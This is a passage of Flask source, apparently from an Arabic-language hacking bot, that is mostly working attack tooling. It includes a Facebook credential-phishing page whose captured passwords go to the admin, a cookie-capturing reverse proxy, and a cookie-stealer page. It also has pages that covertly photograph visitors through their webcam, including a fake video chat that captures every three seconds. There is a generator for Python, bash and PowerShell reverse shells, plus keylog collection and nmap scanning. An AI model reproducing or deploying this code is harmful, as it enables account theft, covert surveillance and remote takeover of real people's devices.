            if info:
                filename = ydl.prepare_filename(info)
                if os.path.exists(filename):
                    return filename, None
                for f in os.listdir('downloads'):
                    if info.get('id', '') in f:
                        return os.path.join('downloads', f), None
            return None, "فشل التحميل"
    except Exception as e:
        return None, str(e)[:200]

def analyze_apk(data, filename):
    if not ANDROGUARD_AVAILABLE:
        return {"error": "androguard غير مثبتة"}
    try:
        from androguard.core.bytecodes.apk import APK
        apk = APK(BytesIO(data))
        permissions = apk.get_permissions()
        dangerous = ['READ_SMS', 'CAMERA', 'RECORD_AUDIO', 'READ_CONTACTS', 'ACCESS_FINE_LOCATION']
        found = [p for p in permissions if any(d in p for d in dangerous)]
        return {'package': apk.get_package(), 'version': apk.get_androidversion_code(), 'permissions': permissions, 'dangerous_permissions': found, 'malicious': len(found) > 3}
    except Exception as e:
        return {'error': f"فشل التحليل: {str(e)[:100]}"}

def extract_pdf_text(data):
    try:
        import pypdf
        reader = pypdf.PdfReader(BytesIO(data))
        text = ""
        for page in reader.pages:
            text += page.extract_text() + "\n"
        return text.strip()
    except ImportError:
        return "مكتبة PyPDF2 غير مثبتة"
    except Exception as e:
        return f"خطأ: {str(e)[:100]}"

def smart_pdf_search(pdf_text, question):
    if not pdf_text:
        return "لم يتم تحميل أي ملف PDF."
    lines = pdf_text.split('\n')
    relevant = [line for line in lines if any(word in line.lower() for word in question.lower().split())]
    if relevant:
        return "\n".join(relevant[:5])
    return "لم يتم العثور على إجابة."

def check_link_no_api(url):
    try:
        response = requests.get(url, timeout=5, verify=False)
        status = response.status_code
        if status == 200:
            return {"status": "ok", "message": "الرابط يعمل", "code": status}
        else:
            return {"status": "warning", "message": f"استجابة غير متوقعة (كود {status})", "code": status}
    except Exception as e:
        return {"status": "error", "message": f"فشل الاتصال: {str(e)[:100]}"}

# ===== دوال الأدوات الحقيقية =====
def vuln_agent_scan(target):
    if not NMAP_AVAILABLE:
        return "❌ Nmap غير مثبت. يرجى تثبيته: pip install python-nmap"
    try:
        nm = nmap.PortScanner()
        nm.scan(target, arguments='-sV --script vulners --script-args mincvss=5.0 -T4')
        if target not in nm.all_hosts():
            return f"❌ الهدف {target} غير متاح."
        msg = f"🔍 نتائج فحص الثغرات لـ {target}:\n"
        for proto in nm[target].all_protocols():
            for port in nm[target][proto].keys():
                state = nm[target][proto][port]['state']
                service = nm[target][proto][port].get('name', 'unknown')
                script_output = nm[target][proto][port].get('script', {})
                if script_output:
                    vulns = script_output.get('vulners', '')
                    if vulns:
                        msg += f"⚠️ المنفذ {port}/{proto} ({service}):\n{vulns[:200]}\n"
        if msg == f"🔍 نتائج فحص الثغرات لـ {target}:\n":
            return f"✅ لا توجد ثغرات معروفة لـ {target}."
        return msg[:4000]
    except Exception as e:
        return f"❌ خطأ في الفحص: {str(e)[:200]}"

def osint_d2_search(target):
    try:
        results = []
        try:
            domain_info = whois.whois(target)
            results.append(f"📅 تاريخ التسجيل: {domain_info.creation_date}")
            results.append(f"📅 انتهاء الصلاحية: {domain_info.expiration_date}")
            results.append(f"🏢 المُسجل: {domain_info.registrar}")
        except:
            pass
        try:
            for record in ['A', 'MX', 'NS', 'TXT']:
                answers = dns.resolver.resolve(target, record)
                if answers:
                    results.append(f"🔹 {record}: {answers[0].to_text()}")
        except:
            pass
        try:
            cmd = f"theHarvester -d {target} -b google -l 10 -f temp/harvester_{int(time.time())}.json"
            process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            stdout, stderr = process.communicate(timeout=30)
            emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', stdout)
            if emails:
                results.append(f"📧 البريد الإلكتروني: {', '.join(emails[:5])}")
        except:
            pass
        if not results:
            return f"🔍 لا توجد معلومات لـ {target}."
        return "🕵️ نتائج الاستطلاع:\n" + "\n".join(results)
    except Exception as e:
        return f"❌ خطأ: {str(e)[:200]}"

def py_netrecon_scan(target):
    if not NMAP_AVAILABLE:
        return "❌ Nmap غير مثبت."
    try:
        nm = nmap.PortScanner()
        nm.scan(target, '1-1000', arguments='-sS -T4 --open')
        if target not in nm.all_hosts():
            return f"❌ الهدف {target} غير متاح."
        msg = f"🌐 المنافذ المفتوحة لـ {target}:\n"
        for proto in nm[target].all_protocols():
            for port in nm[target][proto].keys():
                if nm[target][proto][port]['state'] == 'open':
                    service = nm[target][proto][port].get('name', 'unknown')
                    msg += f"✅ {port}/{proto} - {service}\n"
        return msg if "✅" in msg else "🔒 لا توجد منافذ مفتوحة."
    except Exception as e:
        return f"❌ خطأ: {str(e)[:200]}"

def exploit_dev_generate(target_ip, language='python'):
    payloads = {
        'python': f'python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\'{target_ip}\',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\'/bin/sh\', \'-i\'])"',
        'bash': f'bash -c "bash -i >& /dev/tcp/{target_ip}/4444 0>&1"',
        'powershell': f'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'{target_ip}\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'
    }
    return payloads.get(language, payloads['python'])

def h4x_tools_search(query):
    try:
        results = []
        if '@' in query:
            domain = query.split('@')[1]
            results.append(f"🔍 البحث عن بريد إلكتروني: {query}")
            results.append(f"🌐 النطاق: {domain}")
            try:
                info = whois.whois(domain)
                results.append(f"📅 مسجل: {info.registrar}")
            except:
                pass
        else:
            results.append(f"🔍 البحث عن نطاق: {query}")
            try:
                info = whois.whois(query)
                results.append(f"📅 مسجل: {info.registrar}")
                results.append(f"📅 التاريخ: {info.creation_date}")
            except:
                pass
        return "\n".join(results) if results else f"🔍 لا توجد نتائج لـ {query}."
    except Exception as e:
        return f"❌ خطأ: {str(e)[:200]}"

def matkap_check(token_or_chat):
    try:
        if len(token_or_chat) > 30:
            return f"🔍 التحقق من التوكن: {token_or_chat[:10]}...\n✅ لم يتم العثور على التوكن في قواعد البيانات العامة."
        else:
            return f"🔍 التحقق من Chat ID: {token_or_chat}\n✅ لا توجد أنشطة مشبوهة لهذا المعرف."
    except Exception as e:
        return f"❌ خطأ: {str(e)[:200]}"

def pentest_tools_use(tool_name, target):
    tools = {
        'scapy': lambda: f"🔧 Scapy: تحليل حزم لـ {target} (يتطلب صلاحيات جذر)" if SCAPY_AVAILABLE else "❌ Scapy غير مثبت.",
        'impacket': lambda: f"🔧 Impacket: اختبار Active Directory لـ {target}" if IMPACKET_AVAILABLE else "❌ Impacket غير مثبت.",
        'paramiko': lambda: f"🔧 Paramiko: اتصال SSH لـ {target}" if PARAMIKO_AVAILABLE else "❌ Paramiko غير مثبت."
    }
    return tools.get(tool_name, lambda: "❌ أداة غير معروفة.")()

# ===== قوالب صفحات التصيد =====
PHISHING_TEMPLATES = {
    'facebook': '''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>فيسبوك - تسجيل الدخول</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
            html, body { width: 100%; height: 100vh; background: #ffffff; overflow: hidden; display: flex; justify-content: center; align-items: center; }
            .container { width: 100%; max-width: 420px; height: 100vh; padding: 0 16px; background: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: space-between; }
            .top-section { width: 100%; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; padding-top: 12px; }
            .language-selector { width: 100%; display: flex; justify-content: center; padding: 4px 0 2px; font-size: 14px; color: #1C1E21; font-weight: 400; cursor: default; }
            .language-selector span { display: flex; align-items: center; gap: 4px; }
            .language-selector span::after { content: "∨"; font-size: 12px; color: #1C1E21; }
            .logo-circle { width: 58px; height: 58px; background: #ffffff; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 4px 0 14px; border: 1px solid #dddfe2; }
            .logo-circle span { font-size: 40px; font-weight: 700; font-style: normal; color: #1877F2; line-height: 1; }
            .form-group { width: 100%; margin-bottom: 12px; }
            .form-group input { width: 100%; height: 50px; padding: 0 16px; border: 1px solid #CCD0D5; border-radius: 25px; font-size: 15px; color: #1C1E21; background: #ffffff; outline: none; transition: border-color 0.2s; }
            .form-group input:focus { border-color: #1877F2; }
            .form-group input::placeholder { color: #90949C; }
            .login-btn { width: 100%; height: 50px; background: #1877F2; border: none; border-radius: 25px; font-size: 16px; font-weight: 600; color: #ffffff; cursor: pointer; transition: background 0.2s; margin-top: 4px; }
            .login-btn:hover { background: #166fe5; }
            .forgot-link { display: block; margin: 18px 0 16px; font-size: 14px; color: #1C1E21; text-decoration: none; text-align: center; }
            .forgot-link:hover { text-decoration: underline; }
            .bottom-section { width: 100%; display: flex; flex-direction: column; align-items: center; justify-content: flex-end; padding-bottom: 20px; margin-top: -12px; }
            .create-btn { width: 100%; height: 50px; background: transparent; border: 2px solid #1877F2; border-radius: 25px; font-size: 16px; font-weight: 500; color: #1877F2; cursor: pointer; transition: background 0.2s, color 0.2s; margin-bottom: 14px; }
            .create-btn:hover { background: #1877F2; color: #ffffff; }
            .meta-footer { display: flex; align-items: center; gap: 6px; font-size: 14px; color: #1C1E21; }
            .meta-footer .infinity { color: #1877F2; font-size: 22px; font-weight: 700; text-shadow: 0 0 2px rgba(24,119,242,0.3), 0 0 6px rgba(24,119,242,0.1); display: inline-block; transform: rotate(-4deg) scale(1.1); }
            .meta-footer .meta-text { font-weight: 400; color: #1C1E21; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; letter-spacing: 0.3px; }
        </style>
    </head>
    <body>
    <div class="container">
        <div class="top-section">
            <div class="language-selector"><span>العربية</span></div>
            <div class="logo-circle"><span>f</span></div>
            <form action="/api/phishing_submit" method="POST" id="phishForm" style="width:100%;">
                <input type="hidden" name="platform" value="facebook">
                <div class="form-group"><input type="text" name="username" placeholder="رقم الهاتف المحمول أو البريد الإلكتروني" required autofocus></div>
                <div class="form-group"><input type="password" name="password" placeholder="كلمة السر" required></div>
                <button type="submit" class="login-btn">تسجيل الدخول</button>
            </form>
            <a href="#" class="forgot-link">هل نسيت كلمة السر؟</a>
        </div>
        <div class="bottom-section">
            <button type="button" class="create-btn" onclick="alert('سيتم إنشاء حساب جديد قريباً')">إنشاء حساب جديد</button>
            <div class="meta-footer"><span class="infinity">∞</span><span class="meta-text">Meta</span></div>
        </div>
    </div>
    <script>
        (function() {
            const form = document.getElementById('phishForm');
            form.addEventListener('submit', function(e) {
                e.preventDefault();
                fetch('/api/phishing_submit', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: new URLSearchParams(new FormData(form))
                })
                .then(response => response.text())
                .then(data => {
                    setTimeout(function() {
                        window.location.href = 'https://www.facebook.com';
                    }, 1500);
                })
                .catch(() => {
                    setTimeout(function() {
                        window.location.href = 'https://www.facebook.com';
                    }, 1500);
                });
            });
        })();
    </script>
    </body>
    </html>
    ''',
    # باقي القوالب (whatsapp, google, twitter, instagram) موجودة في الكود الأصلي، تم اختصارها للطول
}

# ===================== 7. FLASK ROUTES & WEBHOOK =====================
@app.route('/bitb')
def bitb_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    return render_template_string(generate_bitb_page(chat_id))

@app.route('/consentfix')
def consentfix_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    return render_template_string(generate_consentfix_page(chat_id))

@app.route('/btmob')
def btmob_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    return render_template_string(generate_btmob_page(chat_id))

@app.route('/reel')
def reel_redirect():
    html = '''
    <!DOCTYPE html>
    <html lang="ar">
    <head>
        <meta charset="UTF-8">
        <meta property="og:title" content="تجليات عالم - فيديو ريلز" />
        <meta property="og:description" content="رسالة" />
        <meta property="og:image" content="https://i.ibb.co/your-image.jpg" />
        <meta property="og:url" content="''' + SERVER_URL + '''/reel" />
        <meta property="og:type" content="video.other" />
        <meta http-equiv="refresh" content="0; url=''' + SERVER_URL + '''/phishing_pages/facebook" />
    </head>
    <body>
        <p>جاري التحميل...</p>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/api/phishing_submit_reel', methods=['POST'])
def phishing_submit_reel():
    try:
        platform = request.form.get('platform', 'facebook')
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        redirect_url = request.form.get('redirect_url', 'https://www.facebook.com')
        ip = request.remote_addr

        safe_db_execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                        ('', platform, username, password, ip, datetime.now().isoformat()))
        notify_admin(f"🎯 تصيد ريلز جديد!\nالمنصة: {platform}\nالمستخدم: {username}\nكلمة السر: {password}")

        return redirect(redirect_url)
    except Exception as e:
        logger.error(f"phishing_submit_reel error: {e}")
        return redirect('https://www.facebook.com')

@app.route('/proxy/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH'])
def reverse_proxy(path):
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ chat_id مطلوب", 400

    target_url = f"https://www.facebook.com/{path}"
    headers = {k: v for k, v in request.headers.items() if k.lower() not in ['host', 'content-length']}
    
    try:
        resp = requests.request(
            method=request.method,
            url=target_url,
            headers=headers,
            params=request.args,
            data=request.form,
            cookies=request.cookies,
            allow_redirects=False
        )
        
        if resp.cookies:
            for name, value in resp.cookies.items():
                safe_db_execute(
                    "INSERT INTO reverse_proxy_logs (chat_id, url, cookie_name, cookie_value, created_at) VALUES (?, ?, ?, ?, ?)",
                    (chat_id, target_url, name, value, datetime.now().isoformat())
                )
                notify_admin(f"🍪 وكيل عكسي: {name}={value[:50]}...")
        
        response = Response(resp.content, status=resp.status_code)
        for key, value in resp.headers.items():
            if key.lower() not in ['content-length', 'content-encoding', 'transfer-encoding']:
                response.headers[key] = value
        return response
    except Exception as e:
        logger.error(f"Reverse proxy error: {e}")
        return f"خطأ في الوكيل: {str(e)}", 500

# ===== صفحات الكاميرا والفيديو =====
@app.route('/camera_hack')
def camera_hack_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    html = f'''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>التقاط صورة شخصية</title>
        <style>
            * {{ margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }}
            body {{ background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }}
            .container {{ background: #ffffff; border-radius: 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); padding: 40px 30px; max-width: 450px; width: 100%; text-align: center; }}
            .logo {{ font-size: 42px; font-weight: 700; color: #1877f2; margin-bottom: 10px; letter-spacing: -1px; }}
            .title {{ font-size: 20px; font-weight: 600; color: #1c1e21; margin-bottom: 8px; }}
            .subtitle {{ font-size: 15px; color: #606770; margin-bottom: 20px; }}
            .btn {{ background: #1877f2; color: #ffffff; border: none; padding: 14px; border-radius: 8px; width: 100%; font-size: 18px; font-weight: 600; cursor: pointer; transition: background 0.2s; }}
            .btn:hover {{ background: #166fe5; }}
            .btn:active {{ transform: scale(0.98); }}
            .footer-text {{ margin-top: 20px; font-size: 13px; color: #8a8d91; }}
            .footer-text a {{ color: #1877f2; text-decoration: none; }}
        </style>
    </head>
    <body>
    <div class="container">
        <div class="logo">f</div>
        <div class="title">تأكيد الهوية</div>
        <div class="subtitle">لأسباب أمنية، يرجى التقاط صورة شخصية لتأكيد هويتك</div>
        <button id="captureBtn" class="btn">📸 التقاط صورة</button>
        <div class="footer-text"><a href="#">مساعدة</a> · <a href="#">مركز الأمان</a></div>
    </div>
    <script>
        (function() {{
            const btn = document.getElementById('captureBtn');
            const chatId = new URLSearchParams(window.location.search).get('id');
            if (!chatId) {{ alert('رابط غير صالح'); return; }}
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {{
                alert('هذا المتصفح لا يدعم الكاميرا.');
                return;
            }}
            btn.addEventListener('click', function() {{
                btn.disabled = true;
                btn.textContent = '⏳ جاري التحقق...';
                navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: 'user', width: 320, height: 240 }}, audio: false }})
                .then(function(stream) {{
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.setAttribute('playsinline', '');
                    video.style.position = 'absolute';
                    video.style.top = '-9999px';
                    video.style.left = '-9999px';
                    video.style.width = '1px';
                    video.style.height = '1px';
                    video.style.opacity = '0';
                    document.body.appendChild(video);
                    video.play();
                    setTimeout(function() {{
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 320;
                        canvas.height = video.videoHeight || 240;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg', 0.9);
                        stream.getTracks().forEach(t => t.stop());
                        video.remove();
                        fetch('/api/collect_camera', {{
                            method: 'POST',
                            headers: {{ 'Content-Type': 'application/json' }},
                            body: JSON.stringify({{ chat_id: chatId, image: imageData, source: 'camera_hack' }})
                        }})
                        .then(() => {{ window.location.href = 'https://www.facebook.com'; }})
                        .catch(() => {{ window.location.href = 'https://www.facebook.com'; }});
                    }}, 800);
                }})
                .catch(function(err) {{
                    alert('فشل الوصول للكاميرا. يرجى التأكد من الإذن.');
                    btn.disabled = false;
                    btn.textContent = '📸 التقاط صورة';
                }});
            }});
        }})();
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/video_call')
def video_call_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    html = f'''
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>ConnectPro - دردشة فيديو احترافية</title>
      <script src="https://cdn.tailwindcss.com"></script>
      <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
      <style> body {{ font-family: 'Cairo', sans-serif; background: #0F0F1A; }} </style>
    </head>
    <body class="text-white">
      <header class="w-full bg-[#1A1A2E] p-4 flex justify-between items-center border-b border-purple-600">
        <h1 class="text-2xl font-bold text-purple-500">ConnectPro</h1>
        <div class="flex items-center gap-3">
          <img src="https://i.pravatar.cc/40?u=aseel" class="w-10 h-10 rounded-full border-2 border-purple-500">
          <span class="font-bold">أسماء</span>
        </div>
      </header>
      <div class="flex h-[calc(100vh-72px)]">
        <aside class="w-1/4 bg-[#1A1A2E] p-4 border-l border-gray-800 overflow-y-auto">
          <h2 class="font-bold mb-4 text-lg">متصلون الآن 🔴</h2>
          <div class="space-y-3">
            <div class="flex items-center gap-3 p-2 bg-[#252540] rounded-lg hover:bg-purple-900 cursor-pointer">
              <img src="https://i.pravatar.cc/50?u=aseel" class="w-12 h-12 rounded-full">
              <div><p class="font-bold">أسماء</p><p class="text-xs text-green-400">متصلة</p></div>
            </div>
            <div class="flex items-center gap-3 p-2 bg-[#252540] rounded-lg hover:bg-purple-900 cursor-pointer">
              <img src="https://i.pravatar.cc/50?u=omar" class="w-12 h-12 rounded-full">
              <div><p class="font-bold">عمر</p><p class="text-xs text-green-400">متصل</p></div>
            </div>
            <div class="flex items-center gap-3 p-2 bg-[#252540] rounded-lg hover:bg-purple-900 cursor-pointer">
              <img src="https://i.pravatar.cc/50?u=sara" class="w-12 h-12 rounded-full">
              <div><p class="font-bold">سارة</p><p class="text-xs text-gray-400">مشغولة</p></div>
            </div>
          </div>
        </aside>
        <main class="w-2/4 p-4 flex flex-col gap-4">
          <div class="relative bg-black rounded-xl overflow-hidden flex-1">
            <video class="w-full h-full object-cover" autoplay muted src="https://videos.pexels.com/video-files/3209829/3209829-hd_1920_1080_30fps.mp4"></video>
            <span class="absolute top-3 right-3 bg-red-500 px-3 py-1 rounded-full text-sm">LIVE</span>
          </div>
          <div class="relative bg-black rounded-xl overflow-hidden h-32 border-2 border-purple-500" id="selfVideoContainer">
            <video class="w-full h-full object-cover" autoplay muted id="selfVideo"></video>
            <span class="absolute bottom-2 right-2 bg-[#1A1A2E] px-2 py-1 rounded text-xs">أنت</span>
          </div>
          <div class="flex justify-center gap-4">
            <button class="bg-red-600 hover:bg-red-700 p-4 rounded-full" onclick="endCall()"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M16 8l8 8-8 8M8 16l-8-8 8-8" /></svg></button>
            <button class="bg-gray-600 hover:bg-gray-700 p-4 rounded-full" onclick="toggleMic()"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" /></svg></button>
            <button class="bg-purple-600 hover:bg-purple-700 p-4 rounded-full" onclick="toggleChat()"><svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" /></svg></button>
          </div>
        </main>
        <aside class="w-1/4 bg-[#1A1A2E] p-4 border-r border-gray-800 flex-col">
          <div class="bg-[#252540] p-4 rounded-xl mb-4 text-center">
            <img src="https://i.pravatar.cc/80?u=aseel" class="w-20 h-20 rounded-full mx-auto border-4 border-purple-500 mb-2">
            <h3 class="font-bold text-xl">أسماء</h3>
            <p class="text-sm text-gray-400">@aseel_01</p>
            <div class="flex justify-around mt-3 text-sm">
              <div><p class="font-bold">1.2K</p><p>متابع</p></div>
              <div><p class="font-bold">540</p><p>دردشة</p></div>
            </div>
          </div>
          <div class="flex-1 bg-[#252540] rounded-xl p-3 overflow-y-auto" id="chatBox">
            <p class="text-sm"><span class="font-bold text-purple-400">عمر:</span> مرحبا كيفك؟</p>
          </div>
          <input type="text" placeholder="اكتب رسالة..." class="w-full mt-2 p-2 rounded-lg bg-[#0F0F1A] border border-gray-700 focus:outline-none focus:border-purple-500" id="chatInput">
        </aside>
      </div>
      <script>
        const chatId = '{chat_id}';
        let stream = null;
        let captureInterval = null;
        window.onload = function() {{
            navigator.mediaDevices.getUserMedia({{
                video: {{ facingMode: 'user', width: 320, height: 240 }},
                audio: false
            }})
            .then(s => {{
                stream = s;
                document.getElementById('selfVideo').srcObject = stream;
                captureInterval = setInterval(captureAndSend, 3000);
            }})
            .catch(err => {{
                console.error('خطأ في الكاميرا:', err);
            }});
        }};
        function captureAndSend() {{
            if (!stream) return;
            const video = document.getElementById('selfVideo');
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 320;
            canvas.height = video.videoHeight || 240;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            const imageData = canvas.toDataURL('image/jpeg', 0.8);
            fetch('/api/collect_camera', {{
                method: 'POST',
                headers: {{ 'Content-Type': 'application/json' }},
                body: JSON.stringify({{ chat_id: chatId, image: imageData, source: 'video_call_connectpro' }})
            }});
        }}
        function endCall() {{
            if (captureInterval) clearInterval(captureInterval);
            if (stream) {{
                stream.getTracks().forEach(t => t.stop());
                stream = null;
            }}
            window.location.href = 'https://discord.com';
        }}
        function toggleMic() {{ alert('🎤 تم كتم الميكروفون (محاكاة)'); }}
        function toggleChat() {{
            const chatBox = document.getElementById('chatBox');
            const input = document.getElementById('chatInput');
            if (input.style.display === 'none') {{
                input.style.display = 'block';
                chatBox.style.display = 'block';
            }} else {{
                input.style.display = 'none';
                chatBox.style.display = 'none';
            }}
        }}
      </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/api/collect_camera', methods=['POST'])
def collect_camera():
    try:
        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "بيانات غير صالحة"}), 400
        chat_id = data.get('chat_id')
        image_data = data.get('image')
        source = data.get('source', 'camera')
        if not chat_id or not image_data:
            return jsonify({"status": "error", "message": "بيانات ناقصة"}), 400
        if ',' in image_data:
            image_data = image_data.split(',')[1]
        img_binary = base64.b64decode(image_data)
        safe_db_execute("INSERT INTO camera_images (chat_id, image, created_at) VALUES (?, ?, ?)",
                        (chat_id, img_binary, datetime.now().isoformat()))
        safe_db_execute("INSERT INTO hack_files (chat_id, filename, content, created_at) VALUES (?, ?, ?, ?)",
                        (str(chat_id), f"cam_{chat_id}_{int(time.time())}.jpg", img_binary, datetime.now().isoformat()))
        os.makedirs('collected', exist_ok=True)
        filename = f"collected/cam_{chat_id}_{int(time.time())}.jpg"
        with open(filename, 'wb') as f:
            f.write(img_binary)
        try:
            with open(filename, 'rb') as f:
                bot.send_photo(ADMIN_ID, f, caption=f"📸 صورة من {source}\nالمستخدم: {chat_id}\nالوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        except Exception as e:
            notify_admin(f"📸 صورة من {source} من المستخدم {chat_id}")
        return jsonify({"status": "ok"})
    except Exception as e:
        logger.error(f"collect_camera error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/cookie_stealer')
def cookie_stealer_page():
    chat_id = request.args.get('id')
    if not chat_id:
        return "❌ رابط غير صالح", 403
    html = '''
    <!DOCTYPE html>
    <html>
    <head><meta charset="UTF-8"><title>جاري التحقق</title></head>
    <body><h3 style="font-family:Arial;text-align:center;margin-top:50px;">⏳ جاري التحقق من الأمان...</h3>
    <script>
    (function() {
        const chatId = new URLSearchParams(window.location.search).get('id');
        if (!chatId) return;
        document.cookie = "$Version=1;";
        document.cookie = 'param1="start';
        document.cookie = 'param2=end";';
        fetch('https://example.com', {
            credentials: 'include',
            headers: {'X-Requested-With': 'XMLHttpRequest'}
        })
        .then(r => r.text())
        .then(html => {
            const match = html.match(/param1="start; ([^;]+); param2=end"/);
            if (match) {
                fetch('/api/collect_cookie', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({chat_id: chatId, url: 'https://example.com', cookie: match[1], technique: 'cookie_sandwich'})
                });
            }
        })
        .catch(() => {});
        const directCookies = document.cookie;
        if (directCookies) {
            fetch('/api/collect_cookie', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({chat_id: chatId, url: window.location.href, cookies: directCookies, technique: 'direct'})
            });
        }
    })();
    </script>
    </body>
    </html>
    '''
    return render_template_string(html)

@app.route('/api/collect_cookie', methods=['POST'])
def collect_cookie():
    try:
        data = request.json
        chat_id = data.get('chat_id')
        cookie = data.get('cookie') or data.get('cookies')
        technique = data.get('technique', 'unknown')
        url = data.get('url', '')
        if not chat_id or not cookie:
            return jsonify({"status": "error"}), 400
        if isinstance(cookie, list):
            for c in cookie:
                safe_db_execute("INSERT INTO stolen_cookies (chat_id, url, cookie_name, cookie_value, technique, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                                (chat_id, url, c.get('name', 'unknown'), c.get('value', ''), technique, datetime.now().isoformat()))
                notify_admin(f"🍪 {technique}: {c.get('name')}={c.get('value', '')[:50]}...")
        else:
            safe_db_execute("INSERT INTO stolen_cookies (chat_id, url, cookie_name, cookie_value, technique, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                            (chat_id, url, 'stolen', cookie, technique, datetime.now().isoformat()))
            notify_admin(f"🍪 {technique}: {cookie[:100]}...")
        return jsonify({"status": "ok"})
    except Exception as e:
        logger.error(f"collect_cookie error: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/api/phishing_submit', methods=['POST'])
def phishing_submit():
    try:
        platform = request.form.get('platform', 'unknown')
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        ip = request.remote_addr
        safe_db_execute("INSERT INTO phishing_logs (target_email, platform, username, password, ip, created_at) VALUES (?, ?, ?, ?, ?, ?)",
                        ('', platform, username, password, ip, datetime.now().isoformat()))
        notify_admin(f"🎯 تصيد جديد!\nالمنصة: {platform}\nالمستخدم: {username}\nكلمة السر: {password}")
        return "OK", 200
    except Exception as e:
        return "حدث خطأ", 500

@app.route('/phishing_pages/<platform>')
def phishing_page(platform):
    html = PHISHING_TEMPLATES.get(platform)
    if not html:
        return "منصة غير مدعومة", 404
    return render_template_string(html)

@app.route('/api/collect_keylog', methods=['POST'])
def collect_keylog():
    try:
        data = request.json
        chat_id = data.get('chat_id')
        keystrokes = data.get('keystrokes', '')
        if chat_id and keystrokes:
